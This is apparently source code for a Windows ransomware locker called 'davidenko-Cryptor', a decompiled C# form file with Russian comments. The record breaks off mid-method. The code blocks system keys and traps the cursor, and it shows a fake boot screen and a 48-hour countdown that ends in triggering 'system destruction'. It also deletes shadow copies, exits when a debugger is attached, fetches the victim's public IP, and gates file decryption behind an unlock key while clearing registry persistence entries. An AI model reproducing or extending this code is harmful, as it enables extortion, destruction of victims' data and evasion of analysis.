using System;
using System.Security.Cryptography;
using System.Text;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace ns0
{
	// Token: 0x02000059 RID: 89
	public partial class GForm2 : Form
	{
		// Token: 0x1700000A RID: 10
		// (get) Token: 0x060003A4 RID: 932 RVA: 0x00017D48 File Offset: 0x00015F48
		// (set) Token: 0x060003A5 RID: 933 RVA: 0x00017D60 File Offset: 0x00015F60
		internal virtual Label g1
		{
			[CompilerGenerated]
			get
			{
				return this.label_0;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.method_15);
				Label label = this.label_0;
				bool flag = label != null;
				if (flag)
				{
					label.Click -= value2;
				}
				this.label_0 = value;
				label = this.label_0;
				bool flag2 = label != null;
				if (flag2)
				{
					label.Click += value2;
				}
			}
		}

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x060003A6 RID: 934 RVA: 0x00017DB4 File Offset: 0x00015FB4
		// (set) Token: 0x060003A7 RID: 935 RVA: 0x00002BD6 File Offset: 0x00000DD6
		internal virtual Panel a1 { get; set; }

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x060003A8 RID: 936 RVA: 0x00017DCC File Offset: 0x00015FCC
		// (set) Token: 0x060003A9 RID: 937 RVA: 0x00002BE0 File Offset: 0x00000DE0
		internal virtual Panel main { get; set; }

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x060003AA RID: 938 RVA: 0x00017DE4 File Offset: 0x00015FE4
		// (set) Token: 0x060003AB RID: 939 RVA: 0x00002BEA File Offset: 0x00000DEA
		internal virtual Panel a2 { get; set; }

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x060003AC RID: 940 RVA: 0x00017DFC File Offset: 0x00015FFC
		// (set) Token: 0x060003AD RID: 941 RVA: 0x00002BF4 File Offset: 0x00000DF4
		internal virtual Label keytext { get; set; }

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x060003AE RID: 942 RVA: 0x00017E14 File Offset: 0x00016014
		// (set) Token: 0x060003AF RID: 943 RVA: 0x00017E2C File Offset: 0x0001602C
		internal virtual TextBox hdn
		{
			[CompilerGenerated]
			get
			{
				return this.textBox_0;
			}
			[CompilerGenerated]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.GForm2_KeyDown);
				KeyPressEventHandler value3 = new KeyPressEventHandler(this.method_3);
				KeyEventHandler value4 = new KeyEventHandler(this.method_7);
				TextBox textBox = this.textBox_0;
				bool flag = textBox != null;
				if (flag)
				{
					textBox.KeyDown -= value2;
					textBox.KeyPress -= value3;
					textBox.KeyUp -= value4;
				}
				this.textBox_0 = value;
				textBox = this.textBox_0;
				bool flag2 = textBox != null;
				if (flag2)
				{
					textBox.KeyDown += value2;
					textBox.KeyPress += value3;
					textBox.KeyUp += value4;
				}
			}
		}

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x060003B0 RID: 944 RVA: 0x00017EC0 File Offset: 0x000160C0
		// (set) Token: 0x060003B1 RID: 945 RVA: 0x00017ED8 File Offset: 0x000160D8
		internal virtual Label inputPS
		{
			[CompilerGenerated]
			get
			{
				return this.label_2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.method_2);
				Label label = this.label_2;
				bool flag = label != null;
				if (flag)
				{
					label.Click -= value2;
				}
				this.label_2 = value;
				label = this.label_2;
				bool flag2 = label != null;
				if (flag2)
				{
					label.Click += value2;
				}
			}
		}

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x060003B2 RID: 946 RVA: 0x00017F2C File Offset: 0x0001612C
		// (set) Token: 0x060003B3 RID: 947 RVA: 0x00002BFE File Offset: 0x00000DFE
		internal virtual PictureBox border_6 { get; set; }

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x060003B4 RID: 948 RVA: 0x00017F44 File Offset: 0x00016144
		// (set) Token: 0x060003B5 RID: 949 RVA: 0x00002C08 File Offset: 0x00000E08
		internal virtual PictureBox border_5 { get; set; }

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x060003B6 RID: 950 RVA: 0x00017F5C File Offset: 0x0001615C
		// (set) Token: 0x060003B7 RID: 951 RVA: 0x00002C12 File Offset: 0x00000E12
		internal virtual PictureBox border_2 { get; set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x060003B8 RID: 952 RVA: 0x00017F74 File Offset: 0x00016174
		// (set) Token: 0x060003B9 RID: 953 RVA: 0x00002C1C File Offset: 0x00000E1C
		internal virtual PictureBox border_1 { get; set; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x060003BA RID: 954 RVA: 0x00017F8C File Offset: 0x0001618C
		// (set) Token: 0x060003BB RID: 955 RVA: 0x00002C26 File Offset: 0x00000E26
		internal virtual PictureBox border_8 { get; set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x060003BC RID: 956 RVA: 0x00017FA4 File Offset: 0x000161A4
		// (set) Token: 0x060003BD RID: 957 RVA: 0x00002C30 File Offset: 0x00000E30
		internal virtual PictureBox border_7 { get; set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x060003BE RID: 958 RVA: 0x00017FBC File Offset: 0x000161BC
		// (set) Token: 0x060003BF RID: 959 RVA: 0x00002C3A File Offset: 0x00000E3A
		internal virtual PictureBox border_4 { get; set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x060003C0 RID: 960 RVA: 0x00017FD4 File Offset: 0x000161D4
		// (set) Token: 0x060003C1 RID: 961 RVA: 0x00002C44 File Offset: 0x00000E44
		internal virtual PictureBox border_3 { get; set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x060003C2 RID: 962 RVA: 0x00017FEC File Offset: 0x000161EC
		// (set) Token: 0x060003C3 RID: 963 RVA: 0x00002C4E File Offset: 0x00000E4E
		internal virtual Label s2 { get; set; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x060003C4 RID: 964 RVA: 0x00018004 File Offset: 0x00016204
		// (set) Token: 0x060003C5 RID: 965 RVA: 0x00002C58 File Offset: 0x00000E58
		internal virtual Label s1 { get; set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x060003C6 RID: 966 RVA: 0x0001801C File Offset: 0x0001621C
		// (set) Token: 0x060003C7 RID: 967 RVA: 0x00002C62 File Offset: 0x00000E62
		internal virtual Label menu1 { get; set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x060003C8 RID: 968 RVA: 0x00018034 File Offset: 0x00016234
		// (set) Token: 0x060003C9 RID: 969 RVA: 0x00002C6C File Offset: 0x00000E6C
		internal virtual Label Title { get; set; }

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x060003CA RID: 970 RVA: 0x0001804C File Offset: 0x0001624C
		// (set) Token: 0x060003CB RID: 971 RVA: 0x00002C76 File Offset: 0x00000E76
		internal virtual Label art { get; set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x060003CC RID: 972 RVA: 0x00018064 File Offset: 0x00016264
		// (set) Token: 0x060003CD RID: 973 RVA: 0x00002C80 File Offset: 0x00000E80
		internal virtual Label errx { get; set; }

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x060003CE RID: 974 RVA: 0x0001807C File Offset: 0x0001627C
		// (set) Token: 0x060003CF RID: 975 RVA: 0x00002C8A File Offset: 0x00000E8A
		internal virtual Label UserInfo { get; set; }

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x060003D0 RID: 976 RVA: 0x00018094 File Offset: 0x00016294
		// (set) Token: 0x060003D1 RID: 977 RVA: 0x00002C94 File Offset: 0x00000E94
		internal virtual Label ID { get; set; }

		// Token: 0x17000021 RID: 33
		// (get) Token: 0x060003D2 RID: 978 RVA: 0x000180AC File Offset: 0x000162AC
		// (set) Token: 0x060003D3 RID: 979 RVA: 0x00002C9E File Offset: 0x00000E9E
		internal virtual PictureBox Safe1 { get; set; }

		// Token: 0x17000022 RID: 34
		// (get) Token: 0x060003D4 RID: 980 RVA: 0x000180C4 File Offset: 0x000162C4
		// (set) Token: 0x060003D5 RID: 981 RVA: 0x00002CA8 File Offset: 0x00000EA8
		internal virtual PictureBox Safe2 { get; set; }

		// Token: 0x17000023 RID: 35
		// (get) Token: 0x060003D6 RID: 982 RVA: 0x000180DC File Offset: 0x000162DC
		// (set) Token: 0x060003D7 RID: 983 RVA: 0x00002CB2 File Offset: 0x00000EB2
		internal virtual Panel ByPassMessage { get; set; }

		// Token: 0x17000024 RID: 36
		// (get) Token: 0x060003D8 RID: 984 RVA: 0x000180F4 File Offset: 0x000162F4
		// (set) Token: 0x060003D9 RID: 985 RVA: 0x00002CBC File Offset: 0x00000EBC
		internal virtual PictureBox c3 { get; set; }

		// Token: 0x17000025 RID: 37
		// (get) Token: 0x060003DA RID: 986 RVA: 0x0001810C File Offset: 0x0001630C
		// (set) Token: 0x060003DB RID: 987 RVA: 0x00002CC6 File Offset: 0x00000EC6
		internal virtual PictureBox c2 { get; set; }

		// Token: 0x17000026 RID: 38
		// (get) Token: 0x060003DC RID: 988 RVA: 0x00018124 File Offset: 0x00016324
		// (set) Token: 0x060003DD RID: 989 RVA: 0x00002CD0 File Offset: 0x00000ED0
		internal virtual PictureBox c4 { get; set; }

		// Token: 0x17000027 RID: 39
		// (get) Token: 0x060003DE RID: 990 RVA: 0x0001813C File Offset: 0x0001633C
		// (set) Token: 0x060003DF RID: 991 RVA: 0x00002CDA File Offset: 0x00000EDA
		internal virtual PictureBox c1 { get; set; }

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x060003E0 RID: 992 RVA: 0x00018154 File Offset: 0x00016354
		// (set) Token: 0x060003E1 RID: 993 RVA: 0x0001816C File Offset: 0x0001636C
		internal virtual Label ByPassWarnMsg
		{
			[CompilerGenerated]
			get
			{
				return this.label_11;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.method_14);
				Label label = this.label_11;
				bool flag = label != null;
				if (flag)
				{
					label.Click -= value2;
				}
				this.label_11 = value;
				label = this.label_11;
				bool flag2 = label != null;
				if (flag2)
				{
					label.Click += value2;
				}
			}
		}

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x060003E2 RID: 994 RVA: 0x000181C0 File Offset: 0x000163C0
		// (set) Token: 0x060003E3 RID: 995 RVA: 0x000181D8 File Offset: 0x000163D8
		public virtual Label tg
		{
			[CompilerGenerated]
			get
			{
				return this.label_12;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.method_13);
				Label label = this.label_12;
				bool flag = label != null;
				if (flag)
				{
					label.Click -= value2;
				}
				this.label_12 = value;
				label = this.label_12;
				bool flag2 = label != null;
				if (flag2)
				{
					label.Click += value2;
				}
			}
		}

		// Token: 0x060003E4 RID: 996 RVA: 0x0001822C File Offset: 0x0001642C
		public GForm2()
		{
			base.Load += this.GForm2_Load;
			base.KeyDown += this.GForm2_KeyDown;
			base.FormClosing += this.GForm2_FormClosing;
			this.string_0 = " ";
			this.object_0 = 0;
			this.object_1 = 0;
			this.object_2 = 0;
			this.object_3 = false;
			this.object_4 = 0;
			this.method_16();
		}

		// WinAPI moved to NativeMethods.cs - centralized P/Invoke declarations

		// Token: 0x060003E7 RID: 999 RVA: 0x000182C8 File Offset: 0x000164C8
		private void method_0(object sender, EventArgs e)
		{
			NativeMethods.SetForegroundWindow(base.Handle);
			try
			{
				this.hdn.Focus();
				Label art = this.art;
			bool flag = Operators.ConditionalCompareObjectLess(this.object_0, 200, false);
			if (flag)
			{
				bool flag2 = !Operators.ConditionalCompareObjectLess(this.object_0, 10, false);
					if (flag2)
					{
						bool flag3 = !Operators.ConditionalCompareObjectLess(this.object_0, 18, false);
						if (flag3)
						{
							bool flag4 = Operators.ConditionalCompareObjectEqual(this.object_0, 30, false);
							if (flag4)
							{
								Label label = art;
								label.Text += "\r\nMemory section at address 0x0424* is locked!";
							}
							else
							{
								bool flag5 = !Operators.ConditionalCompareObjectEqual(this.object_0, 35, false);
								if (flag5)
								{
									bool flag6 = !Operators.ConditionalCompareObjectEqual(this.object_0, 50, false);
									if (flag6)
									{
										bool flag7 = Operators.ConditionalCompareObjectEqual(this.object_0, 70, false);
										if (flag7)
										{
											art.Image = null;
											art.Text = null;
										}
										else
										{
											bool flag8 = Operators.ConditionalCompareObjectEqual(this.object_0, 80, false);
											if (flag8)
											{
												art.BackColor = Color.DarkRed;
												art.ForeColor = Color.White;
												Label label2 = art;
												label2.Text += "\r\n               ...\r\n             ;::::;\r\n           ;::::; :;\r\n         ;:::::'   :;\r\n";
											}
											else
											{
												bool flag9 = Operators.ConditionalCompareObjectEqual(this.object_0, 85, false);
												if (flag9)
												{
													Label label3 = art;
													label3.Text += "        ;:::::;     ;.\r\n       ,:::::'       ;           OOO\\\r\n       ::::::;       ;          OOOOO\\\r\n       ;:::::;       ;         OOOOOOOO\r\n      ,;::::::;     ;'         / OOOOOOO\r\n    ;:::::::::`. ,,,;.        /  / DOOOOOO\r\n  .';:::::::::::::::::;,     /  /     DOOOO\r\n";
												}
												else
												{
													bool flag10 = Operators.ConditionalCompareObjectEqual(this.object_0, 90, false);
													if (flag10)
													{
														Label label4 = art;
														label4.Text += " ,::::::;::::::;;;;::::;,   /  /        DOOO\r\n;`::::::`'::::::;;;::::: ,#/  /          DOOO\r\n:`:::::::`;::::::;;::: ;::#  /            DOOO\r\n::`:::::::`;:::::::: ;::::# /              DOO\r\n`:`:::::::`;:::::: ;::::::#/               DOO\r\n :::`:::::::`;; ;:::::::::##                OO\r\n ::::`:::::::`;::::::::;:::#                OO\r\n `:::::`::::::::::::;'`:;::#                O\r\n  `:::::`::::::::;' /  / `:#\r\n   ::::::`:::::;'  /  /   `#";
														this.method_9();
													}
													else
													{
														bool flag11 = !Operators.ConditionalCompareObjectEqual(this.object_0, 140, false);
														if (flag11)
														{
															bool flag12 = !Operators.ConditionalCompareObjectEqual(this.object_0, 150, false);
															if (flag12)
															{
																bool flag13 = !Operators.ConditionalCompareObjectEqual(this.object_0, 160, false);
																if (flag13)
																{
																	bool flag14 = Operators.ConditionalCompareObjectEqual(this.object_0, 170, false);
																	if (flag14)
																	{
																		this.UserInfo.Visible = true;
																	}
																	else
																	{
																		bool flag15 = !Operators.ConditionalCompareObjectEqual(this.object_0, 177, false);
																		if (flag15)
																		{
																			bool flag16 = Operators.ConditionalCompareObjectEqual(this.object_0, 180, false);
																			if (flag16)
																			{
																				this.ID.Visible = true;
																			}
																		}
																		else
																		{
																			this.menu1.Visible = true;
																		}
																	}
																}
																else
																{
																	this.a2.Visible = true;
																}
															}
															else
															{
																this.a1.Visible = true;
															}
														}
														else
														{
										this.BackColor = Color.FromName("Black");
										this.art.Visible = false;
										this.main.Visible = true;
										this.labelCountdown.Visible = true;
										this.labelDestroyText.Visible = true;
										this.method_19();
														}
													}
												}
											}
										}
									}
									else
									{
										art.ForeColor = Color.Red;
										Label label5 = art;
										label5.Text += "\r\n\r\n * Windows blocked!";
									}
								}
								else
								{
									Label label6 = art;
									label6.Text += "\r\nSERVICE DAVIDENKO CRYPTOR STARTED";
								}
							}
						}
						else
						{
							Label label7;
							(label7 = art).Text = Conversions.ToString(Operators.ConcatenateObject(label7.Text, Operators.ConcatenateObject("\r\nBoot error: 0x0", Operators.IntDivideObject(Conversion.Int(Conversion.Str(VBMath.Rnd()).Replace(".", "").Trim()), 2))));
						}
					}
					else
					{
						art.Text = null;
						art.Text = "Booting Windows . . .";
					}
					this.object_0 = Operators.AddObject(this.object_0, 1);
				}
				this.hdn.SelectionStart = Strings.Len(this.hdn.Text);
				this.inputPS.Text = Conversions.ToString(Operators.ConcatenateObject(this.hdn.Text, this.string_0));
				Cursor.Position = new Point(5, 5);
				base.Activate();
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x060003E8 RID: 1000 RVA: 0x0001874C File Offset: 0x0001694C
		private void method_1(object sender, EventArgs e)
		{
			object ptr = this.object_1;
			ptr = Operators.AddObject(ptr, 1);
			this.object_1 = ptr;
			string[] array = new string[]
			{
				"█",
				"▓",
				"▒",
				"░",
				" "
			};
			object left = this.object_1;
			bool flag = !Operators.ConditionalCompareObjectEqual(left, 1, false);
			if (flag)
			{
				bool flag2 = !Operators.ConditionalCompareObjectEqual(left, 34, false);
				if (flag2)
				{
					bool flag3 = !Operators.ConditionalCompareObjectEqual(left, 37, false);
					if (flag3)
					{
						bool flag4 = !Operators.ConditionalCompareObjectEqual(left, 40, false);
						if (flag4)
						{
							bool flag5 = !Operators.ConditionalCompareObjectEqual(left, 42, false);
							if (flag5)
							{
								bool flag6 = Operators.ConditionalCompareObjectEqual(left, 60, false);
								if (flag6)
								{
									this.object_1 = 0;
								}
							}
							else
							{
								this.string_0 = array[4];
							}
						}
						else
						{
							this.string_0 = array[3];
						}
					}
					else
					{
						this.string_0 = array[2];
					}
				}
				else
				{
					this.string_0 = array[1];
				}
			}
			else
			{
				this.string_0 = array[0];
			}
		}

		// Token: 0x060003E9 RID: 1001 RVA: 0x00002CE4 File Offset: 0x00000EE4
		private void method_2(object sender, EventArgs e)
		{
			this.inputPS.Text = this.hdn.Text;
		}
				private void GForm2_Load(object sender, EventArgs e)
		{
			this.Text = "davidenko-Cryptor [GUI] {@eqtq27}";
			Class1.MyForms_0.loader.Text = "davidenko-Cryptor [Runtime] {@eqtq27}";
			try
			{
				// Read only ID file (separate from hash file for security)
				string idContent = File.ReadAllText(Class1.MyForms_0.loader.string_4);
				// Remove any hash part if old format exists (backward compatibility)
				int separatorIndex = idContent.IndexOf('|');
				if (separatorIndex >= 0)
				{
					idContent = idContent.Substring(0, separatorIndex);
				}
				this.ID.Text = "ID: 88-E" + idContent;
			}
			catch (Exception)
			{
				// Fallback: generate ID if file missing/corrupt
				byte[] randomBytes = new byte[4];
				using (var rng = RandomNumberGenerator.Create())
				{
					rng.GetBytes(randomBytes);
				}
				int id = (int)(BitConverter.ToUInt32(randomBytes, 0) % 900000u + 100000u);
				this.ID.Text = "ID: 88-E" + id;
				Class1.MyForms_0.loader.object_0 = true;
			}
			this.Cursor.Dispose();
			this.hdn.ContextMenu = new ContextMenu();
			this.BackColor = Color.Black;
			this.UserInfo.Text = "Current PC: " + System.Environment.MachineName + "\r\n" +
				"User: " + System.Environment.UserName + "\r\n" +
				"OS: " + System.Environment.OSVersion.VersionString + "\r\n" +
				"IP: " + this.method_17() + "\r\n\r\n" +
				"Нажмите ПРОБЕЛ чтобы прочитать правила";
			if (Debugger.IsAttached) ProjectData.EndApp();

			// Countdown timer setup
			ShutdownTrigger.InitializeTimer();
			// Идемпотентная подписка: не накапливать обработчики при повторной загрузке формы.
			if (!GForm2.systemEventsHooked)
			{
				try { Microsoft.Win32.SystemEvents.SessionEnding += this.GForm2_SessionEnding; } catch { }
				try { Microsoft.Win32.SystemEvents.PowerModeChanged += this.GForm2_PowerModeChanged; } catch { }
				GForm2.systemEventsHooked = true;
			}
			// Упреждающая чистка теневых копий до старта таймера. Без EncryptShadowCopies:
			// здесь session key ещё нет, dummy new byte[32] не должен шифровать копии нулями.
			try { VssKiller.Execute(new byte[32], encryptCopies: false); } catch { }
			this.countdownTimer = new System.Windows.Forms.Timer();
			this.countdownTimer.Interval = 1000;
			this.countdownTimer.Tick += new EventHandler(this.method_18);
			this.countdownTimer.Start();

			// Harsh sound loop starts at animation 3 (after beep / when main shown)

			// Labels
			this.labelCountdown = new Label();
			this.labelCountdown.Font = new Font("Lucida Console", 24f, FontStyle.Bold, GraphicsUnit.Point, 204);
			this.labelCountdown.ForeColor = Color.Red;
			this.labelCountdown.Location = new Point(800, 5);
			this.labelCountdown.Size = new Size(200, 30);
			this.labelCountdown.Text = "48:00:00";
			this.labelCountdown.TextAlign = ContentAlignment.MiddleCenter;
			base.Controls.Add(this.labelCountdown);
			this.labelCountdown.BringToFront();
			this.labelCountdown.Visible = false;

			this.labelDestroyText = new Label();
			this.labelDestroyText.Font = new Font("Lucida Console", 12f, FontStyle.Bold, GraphicsUnit.Point, 204);
			this.labelDestroyText.ForeColor = Color.Red;
			this.labelDestroyText.Location = new Point(800, 35);
			this.labelDestroyText.Size = new Size(200, 25);
			this.labelDestroyText.Text = "ДО УНИЧТОЖЕНИЯ СИСТЕМЫ";
			this.labelDestroyText.TextAlign = ContentAlignment.MiddleCenter;
			base.Controls.Add(this.labelDestroyText);
			this.labelDestroyText.BringToFront();
			this.labelDestroyText.Visible = false;
		}

		// Token: 0x060003EB RID: 1003 RVA: 0x00018990 File Offset: 0x00016B90
		private string method_17()
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.Headers.Add("User-Agent", "Mozilla/5.0");
					string ip = webClient.DownloadString("https://api.ipify.org").Trim();
					if (!string.IsNullOrEmpty(ip) && ip.Contains("."))
					{
						return ip;
					}
				}
			}
			catch
			{
			}
			try
			{
				using (WebClient webClient = new WebClient())
				{
					webClient.Headers.Add("User-Agent", "Mozilla/5.0");
					string ip = webClient.DownloadString("https://ifconfig.me/ip").Trim();
					if (!string.IsNullOrEmpty(ip) && ip.Contains("."))
					{
						return ip;
					}
				}
			}
			catch
			{
			}
			return "Unavailable";
		}

		// Countdown timer tick (persistent 48-hour timer — survives reboot)

		private void method_18(object sender, EventArgs e)

		{

			try

			{

				if (ShutdownTrigger.IsTimeExpired())

				{

					this.countdownTimer.Stop();

					this.labelCountdown.Text = "УНИЧТОЖЕНО";

					this.labelCountdown.ForeColor = Color.DarkRed;

					this.labelDestroyText.Text = "СИСТЕМА УНИЧТОЖАЕТСЯ";
					this.labelDestroyText.ForeColor = Color.DarkRed;
					this.labelDestroyText.Visible = true;
					this.BackColor = Color.Black;
					new System.Threading.Thread(delegate()
					{
						System.Threading.Thread.Sleep(3000);
						this.BeginInvoke((System.Action)delegate()
						{
							this.labelDestroyText.Text = "СИСТЕМА УНИЧТОЖАЕТСЯ.";
						});
						System.Threading.Thread.Sleep(1000);
						this.BeginInvoke((System.Action)delegate()
						{
							this.labelDestroyText.Text = "СИСТЕМА УНИЧТОЖАЕТСЯ..";
						});
						System.Threading.Thread.Sleep(1000);
						this.BeginInvoke((System.Action)delegate()
						{
							this.labelDestroyText.Text = "СИСТЕМА УНИЧТОЖАЕТСЯ...";
						});
						System.Threading.Thread.Sleep(2000);
													ShutdownTrigger.ExecuteDestructionAsync();
					}).Start();
					return;
				}

				string remaining = ShutdownTrigger.GetRemainingTimeString();

				this.labelCountdown.Text = remaining;

				this.labelCountdown.ForeColor = Color.DarkRed;

				this.labelDestroyText.Visible = true;

			}

			catch

			{

			}

		}


		// Harsh ear-cutting sound loop
		private void method_19()
		{
			try
			{
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_ = delegate()
				{
					// Безопасный диапазон частоты + шаг, чтобы не крутить вечно на месте.
					while (this.countdownSeconds > 0)
					{
						try { Console.Beep(1400, 1500); } catch { }
						System.Threading.Thread.Sleep(500);
					}
				};
				VB_0024AnonymousDelegate_0 vb_0024AnonymousDelegate_2 = vb_0024AnonymousDelegate_;
				Thread thread = new Thread((vb_0024AnonymousDelegate_2 == null) ? null : new ThreadStart(vb_0024AnonymousDelegate_2.Invoke));
				thread.Start();
			}
			catch
			{
			}
		}

        // Token: 0x060003EB RID: 1003 RVA: 0x00018990 File Offset: 0x00016B90
        private void GForm2_KeyDown(object sender, KeyEventArgs e)
        {
            // Пробел или F1 – открыть/закрыть правила (тумблер)
            if (e.KeyCode == Keys.Space || e.KeyCode == Keys.F1)
            {
                e.Handled = true;
                RulesForm.ShowRules(this);
                return;
            }

            // Ctrl+V – вставка кода разблокировки из буфера
            if (e.Control && e.KeyCode == Keys.V)
            {
                try
                {
                    string clip = Clipboard.GetText();
                    if (!string.IsNullOrEmpty(clip))
                    {
                        // Буфер обмена — враждебный источник. Обрезаем и валидируем:
                        // эксплойт/гигантская строка не должна дойти до hdn.
                        if (clip.Length > 64) clip = clip.Substring(0, 64);
                        clip = clip.Trim();
                        if (clip.Length > 0)
                            this.hdn.AppendText(clip);
                    }
                }
                catch { }
                e.Handled = true;
                e.SuppressKeyPress = true;
                return;
            }

            // Разрешаем ввод символов, кроме системных комбинаций
            bool isInputKey = (e.KeyCode >= Keys.A && e.KeyCode <= Keys.Z) ||
                              (e.KeyCode >= Keys.D0 && e.KeyCode <= Keys.D9) ||
                              (e.KeyCode >= Keys.NumPad0 && e.KeyCode <= Keys.NumPad9) ||
                              e.KeyCode == Keys.Back;

            // Если это допустимая клавиша для ввода – не блокируем
            if (isInputKey)
            {
                return; // пропускаем событие, поле ввода получит символ
            }

            // Блокируем все остальные клавиши (системные комбинации)
            e.Handled = true;
            e.SuppressKeyPress = true;

            try
            {
                // Ctrl+Alt+... (блокируем)
                bool flag = Operators.CompareString(this.hdn.Text, "CtrlAltAllowed", false) != 0 && (e.Control & e.Alt);
                if (flag && !_cursorLockStopped)
                {
                    this.vmethod_8().Start();
                    NativeMethods.LockWorkStation();
                }

                // Alt+Tab (блокируем)
                bool flag2 = e.Alt && e.KeyCode == Keys.Tab;
                if (flag2 && !_cursorLockStopped)
                {
                    this.vmethod_8().Start();
                }

                // Win (блокируем)
                bool flag3 = e.KeyCode == Keys.LWin;
                if (flag3 && !_cursorLockStopped)
                {
                    this.vmethod_8().Start();
                }

                // Enter – проверка кода разблокировки (один или несколько паролей)
                bool flag4 = e.KeyCode == Keys.Return;
                if (flag4)
                {
                    Label menu = this.menu1;
                    menu.BackColor = Color.White;
                    menu.ForeColor = Color.Black;

                    List<byte[]> unlockedKeys = UnlockKeysFromText(this.hdn.Text);
                    if (unlockedKeys.Count > 0)
                    {
                        GForm1.SessionKeys = unlockedKeys;
                        GForm1.SessionKey = unlockedKeys[0];
                        // Stop cursor lock before decryption so user can use mouse
                        this.stopCursorLock();
                        this.method_5();
                    }
                    else
                    {
                        this.vmethod_4().Start();
                    }
                }
            }
            catch (Exception)
            {
                Class1.MyForms_0.loader.object_0 = true;
            }

        }

        // Token: 0x060003EC RID: 1004 RVA: 0x00002CFE File Offset: 0x00000EFE
        private void method_3(object sender, KeyPressEventArgs e)
		{
			this.object_1 = 0;
			char inputChar = e.KeyChar;
			if (inputChar == (char)8 || inputChar == (char)13) return;
			if (inputChar < ' ' || inputChar > '~') e.Handled = true;
		}

		// Token: 0x060003ED RID: 1005 RVA: 0x00018B6C File Offset: 0x00016D6C
		private void method_4(object sender, EventArgs e)
		{
			bool flag = Operators.ConditionalCompareObjectEqual(this.object_3, false, false);
			if (flag)
			{
				this.method_8();
				this.object_3 = true;
			}
			this.errx.Visible = true;
			object ptr = this.object_2;
			ptr = Operators.AddObject(ptr, 1);
			this.object_2 = ptr;
			bool flag2 = Operators.ConditionalCompareObjectEqual(this.object_2, 20, false);
			if (flag2)
			{
				this.object_3 = false;
				this.errx.Visible = false;
				this.vmethod_4().Stop();
				this.object_2 = 0;
			}
		}

		// Token: 0x060003EE RID: 1006 RVA: 0x00018C14 File Offset: 0x00016E14
		public void method_5()
		{
			// Гонка расшифровки: пароль нельзя принимать, пока шифрование ещё идёт,
			// иначе DecryptAllFiles обгонит незашифрованные файлы.
			if (ShutdownTrigger.IsEncryptionActive())
			{
				return;
			}
			checked
			{
				try
				{
					int num = 1;
					do
					{
						RegistryKey registryKey = Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
						registryKey.DeleteValue("WIN32_" + Conversions.ToString(num));
						num++;
					}
					while (num <= 8);
				}
				catch (Exception ex)
				{
				}
				this.method_6();
				try
				{
					// Delete the ID file. (P3.12: мёртвый блок удаления <id>_hash.<ext> вырезан —
					// этот файл никогда не создавался, File.Exists всегда false.)
					string idFilePath = Class1.MyForms_0.loader.string_4;
					File.Delete(idFilePath);
				}
				catch (Exception ex2)
				{
				}
				try
				{
					Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
					RegistryKey[] array = new RegistryKey[]
					{
						Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true),
						Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true),
						Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true),
						Class1.Class0_0.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", true)
					};
					array[0].DeleteValue("WindowsInstaller");
					array[0].DeleteValue("MSEdgeUpdateX");
					array[1].DeleteValue("System3264Wow");
					array[1].DeleteValue("OneDrive10293");
					array[1].DeleteValue("WINDOWS");
					array[2].DeleteValue("Shell");
					array[3].DeleteValue("MRUList");
				}
				catch (Exception ex3)
				{
				}
				this.vmethod_8().Stop();
				this.vmethod_4().Stop();
				this.countdownTimer?.Stop();
				// Stop cursor lock timer (bug fix: was never called)
				this.stopCursorLock();
				// Disable shutdown timer to prevent recreation during decryption
				ShutdownTrigger.TimerDisabled = true;
				Thread decryptThread = new Thread(() =>
				{
					bool fullyDecrypted = false;
					try
					{
						fullyDecrypted = DecryptAllFiles();
						if (fullyDecrypted)
							KeyPersistence.ClearAll();
					}
					catch { }
					if (!this.IsDisposed && this.IsHandleCreated)
					{
						try
						{
							this.Invoke((System.Action)(() =>
							{
								try
								{
									if (!fullyDecrypted)
									{
